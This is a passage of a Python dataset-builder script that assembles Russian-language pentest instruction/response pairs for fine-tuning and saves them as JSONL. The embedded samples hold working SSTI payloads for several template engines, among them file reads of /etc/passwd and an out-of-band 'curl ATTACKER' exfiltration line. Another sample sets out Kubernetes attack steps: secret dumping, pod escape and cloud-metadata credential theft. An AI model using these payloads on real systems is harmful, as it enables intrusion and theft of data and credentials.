                          "    {{ config.__class__.__init__.__globals__['os'].popen('id').read() }}\n\n"
                          "11. Через lipsum (Jinja2):\n"
                          "    {{ lipsum.__globals__['os'].popen('id').read() }}\n\n"
                          "12. Через request (Flask):\n"
                          "    {{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}\n\n"
                          "ДРУГИЕ ДВИЖКИ:\n"
                          "13. Twig (PHP): {{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}\n"
                          "14. ERB (Ruby): <%= system('id') %>\n"
                          "15. Jade/Pug (Node.js): #{global.process.mainModule.require('child_process').execSync('id')}\n\n"
                          "ЕСЛИ RCE НЕ РАБОТАЕТ:\n"
                          "16. Читаю файлы: {{ ''.__class__.__mro__[1].__subclasses__()[X]('/etc/passwd').read() }}\n"
                          "17. Blind SSTI: {{ config if sleep }} → time-based\n"
                          "18. Out-of-band: {{ ''.__class__.__mro__[1].__subclasses__()[X]('curl ATTACKER?data=$(id|base64)') }}\n\n"
                          "ИНСТРУМЕНТЫ:\n"
                          "- tplmap — автоматический SSTI detection/exploit\n"
                          "- SSTImap\n"
                          "- Burp: ручное тестирование через Repeater",
            },
            {
                "instruction": "Ты тестируешь Kubernetes кластер. Опиши векторы атак на K8s.",
                "output": "Kubernetes пентест — векторы атак:\n\n"
                          "1. Разведка:\n"
                          "   - kubectl cluster-info\n"
                          "   - kubectl get pods --all-namespaces\n"
                          "   - kubectl get secrets --all-namespaces\n"
                          "   - kubectl get serviceaccounts\n"
                          "   - etcd: проверяю доступность (обычно 2379)\n\n"
                          "2. RBAC Misconfiguration:\n"
                          "   - kubectl auth can-i --list\n"
                          "   - Могу ли создавать pods? → escape to node\n"
                          "   - Могу ли читать secrets во всех namespaces?\n"
                          "   - Могу ли создавать ClusterRoleBinding? → cluster-admin\n"
                          "   - Проверяю kubescape / kube-bench\n\n"
                          "3. Secret Exfiltration:\n"
                          "   - kubectl get secrets -o yaml\n"
                          "   - Декодирую base64: echo '...' | base64 -d\n"
                          "   - Ищу: cloud creds, API keys, токены, пароли БД\n"
                          "   - ServiceAccount токены: можно использовать для API доступа\n\n"
                          "4. Pod Escape:\n"
                          "   - Privileged pod: hostPID, hostNetwork, privileged\n"
                          "   - Mount host filesystem: mount /dev/sda1 /mnt → chroot /mnt\n"
                          "   - nsenter -t 1 -m -u -i -n -p -- sh\n"
                          "   - CRI socket: /run/containerd/containerd.sock, /var/run/dockershim.sock\n"
                          "   - crictl / docker через mounted socket\n\n"
                          "5. Cloud Metadata (если в облаке):\n"
                          "   - curl http://169.254.169.254/latest/meta-data/\n"
                          "   - IAM credentials из metadata\n"
                          "   - IMDSv2: PUT + GET с токеном\n\n"
                          "6. Supply Chain:\n"
                          "   - Образы из публичных registry\n"
                          "   - latest тег → непредсказуемое поведение\n"
                          "   - Dockerfile: проверяю на hardcoded secrets\n"
                          "   - Helm charts: values.yaml с паролями\n\n"
                          "7. Network Policies:\n"
                          "   - Проверяю east-west трафик — могу ли достучаться до соседних pods?\n"
                          "   - Service endpoints доступны из моего пода?\n"
                          "   - kube-apiserver доступен?\n\n"
                          "8. Инструменты:\n"
                          "   - kube-hunter — автоматический поиск уязвимостей K8s\n"
                          "   - kubeaudit — аудит конфигурации\n"
                          "   - kubesploit — pentest framework\n"
                          "   - peirates — post-exploitation в K8s\n"
                          "   - kdigger — контекстная разведка внутри пода",
            },
        ]

        samples = []
        for p in patterns:
            samples.append({
                "instruction": p["instruction"],
                "input": "",
                "output": p["output"],
            })

        return samples

    # ── Save ─────────────────────────────────────────────────

    def save_dataset(self, samples: list):
        """Save in JSONL format for fine-tuning."""
        ts = datetime.now().strftime("%Y%m%d_%H%M")

        # Full dataset
        with open(PROCESSED / f"dataset_{ts}.jsonl", "w") as f:
            for s in samples:
                f.write(json.dumps(s, ensure_ascii=False) + "\n")

        # Split: train (80%) / val (20%)
        split = int(len(samples) * 0.8)
        train = samples[:split]
        val = samples[split:]

        with open(PROCESSED / "train.jsonl", "w") as f:
            for s in train:
                f.write(json.dumps(s, ensure_ascii=False) + "\n")

        with open(PROCESSED / "val.jsonl", "w") as f:
            for s in val:
                f.write(json.dumps(s, ensure_ascii=False) + "\n")

        # Stats
        with open(PROCESSED / f"stats_{ts}.json", "w") as f:
            json.dump({
                "total_samples": len(samples),
                "train_samples": len(train),
                "val_samples": len(val),
                "sources": {
                    "cve": sum(1 for s in samples if "CVE:" in s.get("input", "")),
                    "hackerone": sum(1 for s in samples if "Vulnerability:" in s.get("input", "")),
                    "exploitdb": sum(1 for s in samples if "Exploit:" in s.get("input", "")),
                    "synthetic": sum(1 for s in samples if s.get("input") == ""),
                },
                "created": ts,
            }, f, indent=2)

        print(f"  train.jsonl: {len(train)} samples")
        print(f"  val.jsonl: {len(val)} samples")


async def main():
    builder = DatasetBuilder()
    await builder.collect_all()


if __name__ == "__main__":
    asyncio.run(main())